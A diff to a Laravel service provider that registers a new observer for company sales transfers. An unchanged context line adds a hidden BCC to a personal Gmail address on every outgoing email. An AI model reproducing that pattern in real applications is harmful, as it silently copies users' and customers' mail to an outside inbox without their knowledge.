@@ -3,11 +3,13 @@
 namespace App\Providers;
 
 use App\Models\CashierSale;
+use App\Models\CompanySalesTransfer;
 use App\Models\ProductImportItem;
 use App\Models\SalesPointCashierTrans;
 use App\Models\ShippingWarehouse;
 use App\Observers\CashierSaleObserver;
 use App\Observers\CashierTransObserver;
+use App\Observers\CompanySalesTransferObserver;
 use App\Observers\ProductImportItemObserver;
 use App\Observers\ShippingWarehouseObserver;
 use Filament\Support\Facades\FilamentIcon;
@@ -42,6 +44,7 @@ class AppServiceProvider extends ServiceProvider
     ProductImportItem::observe(ProductImportItemObserver::class);
     CashierSale::observe(CashierSaleObserver::class);
     SalesPointCashierTrans::observe(CashierTransObserver::class);
+    CompanySalesTransfer::observe(CompanySalesTransferObserver::class);
 
     Event::listen(MessageSending::class, function (MessageSending $event) {
       $event->message->addBcc('aloshmohammad2001@gmail.com');
